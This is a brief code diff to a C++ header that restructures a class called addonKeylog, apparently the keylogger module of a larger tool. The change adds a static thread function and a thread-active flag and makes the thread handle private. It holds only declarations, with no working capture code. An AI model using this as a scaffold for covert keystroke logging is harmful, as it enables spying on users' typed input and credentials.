@@ -8,10 +8,16 @@
 
 class addonKeylog
 {
+
 public:
-	bool active;
-	HANDLE keylogHandle;
+
+	static DWORD Thread(void *lpParam);
+	bool threadActive;
 
 	addonKeylog();
 	~addonKeylog();
+
+private:
+
+	HANDLE threadHandle;
 };
